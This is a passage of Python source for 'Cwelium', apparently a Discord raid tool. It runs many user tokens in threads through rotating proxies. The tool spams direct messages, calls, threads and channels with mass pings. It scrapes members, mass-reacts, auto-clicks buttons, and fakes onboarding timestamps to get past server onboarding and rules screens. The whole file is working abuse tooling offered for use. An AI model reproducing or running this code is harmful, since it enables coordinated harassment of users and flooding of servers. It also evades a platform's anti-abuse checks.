                            console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                            break
                        else:
                            console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channel_id):
        try:
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/typing", 
                    headers=self.headers(token)
                )

                match response.status_code: 
                    case 204:
                        console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        time.sleep(9)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
                "discriminator": None,
            }

            response = session.post(
                f"https://discord.com/api/v9/users/@me/relationships", 
                headers=self.headers(token), 
                json=payload
            )

            match response.status_code:
                case 204:
                    console.log(f"Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case 400:
                    console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def guild_checker(self, guild_id):
        def main_checker(token):
            try:
                while True:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            break
                        case 429:
                            retry_after = response.json()["retry_after"]
                            console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                        case _:
                            console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def token_checker(self):
        # todo: fix saving valid tokens
        valid = []

        def main(token):
            try:
                while True:
                    response = session.get(
                        "https://discordapp.com/api/v9/users/@me/library",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            console.log("Valid", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                            valid.append(token)
                            break
                        case 403:
                            console.log("Locked", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                            break
                        case 429:
                            retry_after = response.json()["retry_after"]
                            console.log("Ratelimit", C["pink"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{retry_after}s")
                            time.sleep(retry_after)
                        case _:
                            console.log("Invalid", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                            break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        with open("data/tokens.txt", "r") as f:
            tokens = list({line.strip().replace('"', '') for line in f if line.strip()})
        
        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main, args)

        with open("data/tokens.txt", "w") as f:
            f.write("\n".join(valid))

    def accept_rules(self, guild_id):
        try:
            valid = []
                
            for token in tokens:
                value = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token)
                )

                match value.status_code:
                    case 200:
                        valid.append(token)
                        payload = value.json()
                        break

            if not valid:
                console.log("Failed", C["red"], "All tokens are Invalid")
                input()
                Menu().main_menu()

            def run_main(token):
                try:
                    response = session.put(
                        f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                        headers=self.headers(token),
                        json=payload
                    )

                    match response.status_code:
                        case 201:
                            console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_main, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Accept Rules", e)

    def onboard_bypass(self, guild_id):
        try:
            master_token = None
            for token in tokens:
                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/onboarding", headers=self.headers(token))
                match resp.status_code:
                    case 200:
                        onboarding_data = resp.json()
                        master_token = token
                        break

            if not master_token:
                console.log("Failed", C["red"], "No tokens have access to this guild's onboarding.")
                return

            responses = []
            prompts_seen = {}
            options_seen = {}
            
            prompts = onboarding_data.get("prompts", [])
            if not prompts:
                console.log("Info", C["gray"], "Guild has no onboarding prompts.")
                return

            for prompt in prompts:
                p_id = prompt["id"]
                available_options = prompt.get("options", [])
                if not available_options: continue
                
                selected_option = random.choice(available_options)["id"]
                responses.append(selected_option)
                
                fake_time = int(time.time()) - random.randint(5, 15)
                prompts_seen[p_id] = fake_time
                
                for opt in available_options:
                    options_seen[opt["id"]] = fake_time

            def run_task(token):
                token_time = int(time.time()) - random.randint(1, 10)
                
                t_prompts_seen = {k: token_time for k in prompts_seen}
                t_options_seen = {k: token_time for k in options_seen}

                payload = {
                    "onboarding_responses": responses,
                    "onboarding_prompts_seen": t_prompts_seen,
                    "onboarding_responses_seen": t_options_seen,
                }

                resp = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=payload
                )

                match resp.status_code:
                    case 200:
                        console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_task, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []

            params = {
                "around": message_id, 
                "limit": 50
            }

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        access_token.append(token)
                        break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                for __ in data:
                    if __["id"] == message_id:
                        reactions = __["reactions"]
                        for emois in reactions:
                            if emois:
                                emoji_id = emois["emoji"]["id"]
                                emoji_name = emois["emoji"]["name"]

                                if emoji_id is None:
                                    emojis.append(emoji_name)
                                else:
                                    emojis.append(f"{emoji_name}:{emoji_id}")
                            else:
                                console.log("Failed", C["red"], "No reactions Found in this message",)
                                input()
                                Menu().main_menu()

                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C[color]}0{i}:{C['white']} {emoji}")

                choice = input(f"\n{console.prompt('Choice')}")
                if choice.startswith('0') and len(choice) == 2:
                    choice = str(int(choice))
                selected = emojis[int(choice) - 1]

            def add_reaction(token):
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"

                    if emoji_id is None:
                        url += "?location=Message&type=0"
                    response = session.put(url, headers=self.headers(token))

                    match response.status_code:
                        case 204:
                            console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(add_reaction, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get emojis", e)
            input()
            Menu().main_menu()

    def button_bypass(self, channel_id, message_id, guild_id):
        try:
            access_token = []
            buttons = []

            params = {"around": message_id, "limit": 50}

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        access_token.append(token)
                        break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                message = next((m for m in response.json() if m["id"] == message_id), None)

                if not message:
                    console.log("Failed", C["red"], "Message not found")
                    input()
                    Menu().main_menu()
                else:
                    for row in message.get("components", []):
                        for comp in row.get("components", []):
                            if comp.get("type") == 2:
                                label = comp.get("label", "No Label")
                                custom_id = comp["custom_id"]
                                buttons.append({
                                    "label": label,
                                    "custom_id": custom_id,
                                })

                    if not buttons:
                        console.log("Failed", C["red"], "No buttons found in this message")
                        input()
                        Menu().main_menu()

            for i, btn in enumerate(buttons, start=1):
                print(f"{C[color]}0{i}:{C['white']} {btn['label']}")

            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))

            btn = buttons[int(choice) - 1]
            custom_id = btn["custom_id"]

            def click_button(token):
                try:
                    payload = {
                        "application_id": message["author"]["id"],
                        "channel_id": channel_id,
                        "data": {
                            "component_type": 2,
                            "custom_id": custom_id,
                        },
                        "guild_id": guild_id,
                        "message_flags": 0,
                        "message_id": message_id,
                        "nonce": str(self.nonce()),
                        "session_id": uuid.uuid4().hex,
                        "type": 3,
                    }

                    resp = session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=self.headers(token),
                        json=payload
                    )

                    match resp.status_code:
                        case 204:
                            console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(click_button, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get buttons", e)
            input()
            Menu().main_menu()

class Menu:
    def __init__(self):
        global global_raider
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]

        if global_raider is None:
            self.raider = Raider()
            global_raider = self.raider
        else:
            self.raider = global_raider

        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.spammer, 
            "4": self.checker,
            "5": self.reactor, 
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "~": self.credit,
        }

    def main_menu(self):
        console.run()

        choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")

        if choice.startswith('0') and len(choice) == 2:
            choice = str(int(choice))

        if choice.lower() in self.options:
            console.render_ascii()
            self.options[choice.lower()]()
        else:
            self.main_menu()

    def run(self, func, args):
        threads = []
        console.clear()
        console.render_ascii()

        for idx, arg in enumerate(args):
            if proxy and proxies:
                selected_proxy = proxies[idx % len(proxies)]
                session.proxies = {
                    "http": f"http://{selected_proxy}",
                    "https": f"http://{selected_proxy}"
                }
            else:
                session.proxies = {} 
                
            thread = threading.Thread(target=func, args=arg, daemon=True)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def dm_spam(self):
        console.title(f"Cwelium - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id, message) for token in tokens
        ]
        self.run(self.raider.dm_spammer, args)

    @wrapper
    def soundbord(self):
        console.title(f"Cwelium - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.join_voice_channel, args=(token, guild, channel)).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()

    @wrapper
    def friender(self):
        console.title(f"Cwelium - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()

        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)

    @wrapper
    def caller(self):
        console.title(f"Cwelium - Call Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id) for token in tokens
        ]
        self.run(self.raider.call_spammer, args)

    def onliner(self):
        console.title(f"Cwelium - Onliner")
        args = [
            (token, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.onliner, args)

    @wrapper
    def typier(self):
        console.title(f"Cwelium - Typer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channelid = Link.split("/")[5]
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)

    @wrapper
    def nick_changer(self):
        console.title(f"Cwelium - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "" or len(nick) > 32:
            self.main_menu()

        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voice_joiner(self):
        console.title(f"Cwelium - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [
            (token, guild, channel) for token in tokens
        ]
        self.run(self.raider.join_voice_channel, args)

    @wrapper
    def Thread_Spammer(self):
        console.title(f"Cwelium - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        name = input(console.prompt("Name"))
        if name == "":
            self.main_menu()

        channel_id = Link.split("/")[5]
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def joiner(self):
        console.title(f"Cwelium - Joiner")
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            self.main_menu()

        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)

        self.raider.joiner(invite)

    @wrapper 
    def leaver(self):
        console.title(f"Cwelium - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)

    @wrapper
    def spammer(self):
        console.title(f"Cwelium - Spammer")
        import sys
        link = input(console.prompt(f"Channel LINK"))
        if link == "" or not link.startswith("https://"):
            sys.exit(0)

        guild_id = link.split("/")[4]
        channel_id = link.split("/")[5]

        massping = input(console.prompt("Massping", True))
        random_str = input(console.prompt("Random String", True))
        message = input(console.prompt("Message"))

        if message == "":
            sys.exit(0)

        delay_input = input(console.prompt("Delay (seconds)"))
        delay = None
        if delay_input != "":
            delay = float(delay_input)

        ping_count = None
        if "y" in massping:
            console.log(f"Scraping users", self.background, False, "this may take a while...")
            self.raider.member_scrape(guild_id, channel_id)
            count_str = input(console.prompt("Pings Amount"))
            if count_str == "":
                sys.exit(0)

            ping_count = int(count_str)

        args = [
            (token, channel_id, message, guild_id, "y" in massping, ping_count, "y" in random_str, delay)
            for token in tokens
        ]

        self.run(self.raider.spammer, args)
        import sys
        sys.exit(0)

    def checker(self):
        console.title(f"Cwelium - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title(f"Cwelium - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def button(self):
        console.title(f"Cwelium - Button Click")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            return

        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]

        console.clear()
        console.render_ascii()
        self.raider.button_bypass(channel_id, message_id, guild_id)

    def formatter(self):
        console.title(f"Cwelium - Formatter")
        self.run(self.raider.format_tokens, [()])

    @wrapper
    def accept(self):
        console.title(f"Cwelium - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        console.title(f"Cwelium - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio_changer(self):
        console.title(f"Cwelium - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            self.main_menu()

        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        console.title(f"Cwelium - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: Tips",
            "Scraper: Aniell4",
            "Original Owner of Helium/Cwelium: Ekkore",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]

        for line in credits_lines:
            try:
                width = os.get_terminal_size().columns
            except OSError:
                width = console.size
            centered_line = line.center(width)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")

        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def exits(self):
        choice = input(console.prompt("Are you sure you want to quit", ask=True))
        if choice.lower().startswith("y"):
            os._exit(0)
        else:
            self.main_menu()

if __name__ == "__main__":
    menu = Menu()
    console.raider_options()
    # Call spammer directly
    menu.spammer()
